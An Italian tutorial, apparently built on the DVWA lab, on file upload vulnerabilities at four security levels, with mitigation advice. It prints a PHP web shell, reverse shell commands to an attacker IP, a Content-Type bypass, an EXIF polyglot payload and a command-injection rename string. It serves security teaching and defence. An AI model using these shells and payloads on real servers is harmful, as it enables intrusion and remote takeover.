⬆️ File Upload Vulnerabilities

Caricare file malevoli per compromettere server web

📖 Cos'è una Vulnerabilità di File Upload?

Definizione

Le vulnerabilità di File Upload si verificano quando un'applicazione web permette agli utenti di caricare file senza controlli adeguati su tipo, contenuto o nome del file. Un attaccante può sfruttarle per:

  • 🚀 Eseguire codice arbitrario sul server (Web Shell)
  • 💣 Sovrascrivere file di sistema critici
  • 📂 Upload di file malevoli (malware, phishing)
  • 🎯 DoS tramite upload di file enormi

Web Shell: La Minaccia Principale

Una web shell è uno script caricato sul server che permette all'attaccante di eseguire comandi remoti. Esempio in PHP: 

<?php system($_GET['cmd']); ?>

Una volta caricato e accessibile, l'attaccante ha controllo completo:

http://victim.com/uploads/shell.php?cmd=whoami
http://victim.com/uploads/shell.php?cmd=cat%20/etc/passwd

Low Security Vulnerabilità e Sfruttamento

⚠️ Vulnerabilità: Nessuna validazione sul file caricato. Qualsiasi file viene accettato e salvato nella directory uploads.

Codice Vulnerabile (Concettuale):

$target_path = "hackable/uploads/" . basename($_FILES['uploaded']['name']);
move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path);

🎯 Attacco: Upload di Web Shell

Procedura:

  1. Creare file PHP malevolo (shell.php): 
    <?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
  2. Caricare il file tramite il form di upload
  3. Navigare all'URL del file caricato: 
    http://target/hackable/uploads/shell.php
  4. Eseguire comandi: 
    http://target/hackable/uploads/shell.php?cmd=whoami

💡 Ottenere Reverse Shell:

# 1. Avviare listener sulla macchina attaccante
nc -lvnp 4444

# 2. Usare web shell per connettersi
http://target/uploads/shell.php?cmd=nc -e /bin/bash 192.168.1.100 4444

# Alternativa con bash
http://target/uploads/shell.php?cmd=bash -i >& /dev/tcp/192.168.1.100/4444 0>&1

Una volta connessa la reverse shell, l'attaccante ha una shell interattiva sul server e può eseguire qualsiasi comando!

Medium Security Protezioni Implementate

🛡️ Nuove Difese: Validazione del tipo MIME (Content-Type) e dimensione file

Codice di Validazione:

$uploaded_type = $_FILES['uploaded']['type'];
$uploaded_size = $_FILES['uploaded']['size'];

if (($uploaded_type == "image/jpeg" || $uploaded_type == "image/png") && 
    ($uploaded_size < 100000)) {
    // Procedi con upload
} else {
    echo "File not uploaded. Only JPEG and PNG allowed, max 100KB";
}

🎯 Bypass: Manipolazione Content-Type

Il Content-Type è controllato dal client e può essere facilmente manipolato usando Burp Suite.

Procedura con Burp Suite:

  1. Configurare il proxy e intercettare il traffico
  2. Caricare la web shell PHP
  3. Intercettare la richiesta POST in Burp Suite
  4. Modificare l'header Content-Type: 
    Content-Type: image/png
  5. Inoltrare la richiesta modificata

💡 Esempio di Richiesta Modificata:

POST /dvwa/vulnerabilities/upload/ HTTP/1.1
...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploaded"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--

Il server vede Content-Type: image/png e accetta il file, ma in realtà è PHP eseguibile!

Lezione: Mai fidarsi degli header HTTP forniti dal client.

High Security Protezioni Avanzate

🛡️ Difese Implementate:
  • Validazione estensione file (.jpg, .jpeg, .png)
  • Uso di getimagesize() per verificare che sia un'immagine reale

Codice di Validazione:

$uploaded_name = $_FILES['uploaded']['name'];
$uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, '.') + 1);

if (($uploaded_ext == "jpg" || $uploaded_ext == "jpeg" || $uploaded_ext == "png") &&
    (getimagesize($_FILES['uploaded']['tmp_name']) !== false)) {
    // Procedi con upload
} else {
    echo "File is not a valid image";
}

getimagesize() legge i metadati dell'immagine e fallisce se il file non è un'immagine valida.

🎯 Bypass: Polyglot File + Command Injection

Dobbiamo creare un file che sia CONTEMPORANEAMENTE un'immagine valida E contenga codice PHP eseguibile.

Procedura:

  1. Scaricare immagine JPEG legittima: 
    wget https://example.com/image.jpg
  2. Iniettare payload PHP nei metadati con ExifTool: 
    exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
  3. Caricare l'immagine modificata (upload riuscirà!)
  4. Usare Command Injection per rinominare .jpg in .php: 
    127.0.0.1|mv ../../hackable/uploads/image.jpg ../../hackable/uploads/image.php
  5. Accedere alla web shell: 
    http://target/hackable/uploads/image.php?cmd=whoami

💡 Spiegazione Completa:

  1. Polyglot File: Il file ha header/metadati validi di immagine JPEG, quindi passa getimagesize()
  2. Payload nei Metadati: ExifTool inserisce il codice PHP nel campo Comment dell'immagine
  3. Rinomina via Command Injection: Cambiando l'estensione da .jpg a .php, il server eseguirà il codice PHP invece di servire l'immagine

Catena di Exploit: Questo attacco richiede DUE vulnerabilità: File Upload debole + Command Injection. È un esempio di attack chaining!

Impossible Implementazione Sicura

✅ Difese Implementate:
  • Token Anti-CSRF
  • MD5 hash del filename con timestamp (previene collisioni)
  • imagecreatefromjpeg() / imagecreatefrompng() - riprocessa l'immagine

Approccio Sicuro (Concettuale):

// Genera nome file sicuro
$target_file = md5(uniqid() . $uploaded_name) . "." . $uploaded_ext;

// Valida e riprocessa immagine
if ($uploaded_ext == "jpg" || $uploaded_ext == "jpeg") {
    $img = imagecreatefromjpeg($uploaded_file);
} else if ($uploaded_ext == "png") {
    $img = imagecreatefrompng($uploaded_file);
}

if ($img !== false) {
    // Salva immagine riprocessata (rimuove metadati malevoli!)
    imagejpeg($img, $target_path . $target_file);
    imagedestroy($img);
}

💡 Perché è Sicuro:

  • ✅ Nome randomizzato: Impossibile prevedere il nome finale
  • ✅ Riprocessamento immagine: imagecreatefrom*() legge l'immagine e la ricrea, rimuovendo tutti i metadati e payload iniettati
  • ✅ Anti-CSRF token: Previene upload automatizzati
  • ✅ Validazione rigorosa: Solo JPEG/PNG validati

Chiave: Il riprocessamento dell'immagine rimuove qualsiasi codice malevolo dai metadati, rendendo il polyglot attack inefficace.

🛡️ Strategie di Mitigazione

1. Validazione Tipo File Multi-Livello

  • Estensione: Whitelist di estensioni permesse
  • Magic Bytes: Verificare i primi byte del file (firma)
  • MIME Type validation: Controllare Content-Type (ma non fidarsi solo di questo!)
  • Content inspection: Analizzare contenuto del file
// Verifica magic bytes (PHP)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $uploaded_file);
finfo_close($finfo);

if (!in_array($mime, ['image/jpeg', 'image/png'])) {
    die('Invalid file type');
}

2. Riprocessamento File

  • Immagini: Usare librerie GD o ImageMagick per ricreare l'immagine
  • PDF: Riprocessare con librerie PDF sicure
  • Documenti: Convertire in formato sicuro

Il riprocessamento rimuove metadati, macro, e codice embedded.

3. Safe File Storage

  • Directory non eseguibile: Configurare web server per non eseguire script in /uploads
  • Fuori dalla webroot: Salvare file fuori dalla directory web pubblica
  • Nome randomizzato: Mai usare nome originale del file
  • Serve tramite script: Usare script PHP/Python per servire file invece di accesso diretto

Apache .htaccess in /uploads:

<FilesMatch "\.(php|phtml|php3|php4|php5|pl|py|jsp|asp|sh|cgi)$">
    deny from all
</FilesMatch>

Nginx configuration:

location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}

4. Restrizioni Dimensione e Quantità

  • Limitare dimensione massima file (lato client E server)
  • Limitare numero di upload per utente/sessione
  • Limitare spazio totale di storage per utente
  • Rate limiting per prevenire upload automatizzati

5. Antivirus e Malware Scanning

  • Scansione antivirus di tutti i file caricati
  • Integrazione con ClamAV o servizi cloud (VirusTotal API)
  • Quarantena file sospetti
// PHP con ClamAV
exec("clamscan --no-summary " . escapeshellarg($file), $output, $return);
if ($return !== 0) {
    unlink($file);
    die('File rejected: malware detected');
}

6. Permessi File Corretti

  • File caricati: 644 (rw-r--r--) - non eseguibili
  • Directory upload: 755 (rwxr-xr-x)
  • Ownership corretto (www-data o utente web server)
// Imposta permessi sicuri dopo upload
chmod($uploaded_file, 0644);
chown($uploaded_file, 'www-data');

7. Content Security Policy

  • Impedire esecuzione inline script dalle directory upload
  • Usare sandbox attribute per iframe con contenuto utente
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

📌 Riepilogo

Le vulnerabilità di file upload permettono esecuzione codice remoto tramite web shell. La difesa richiede validazione multi-livello, riprocessamento file, storage sicuro, e configurazione server che previene esecuzione script in directory upload.

Defense in Depth: Combina validazione, riprocessamento, permessi, e configurazione server per protezione completa.
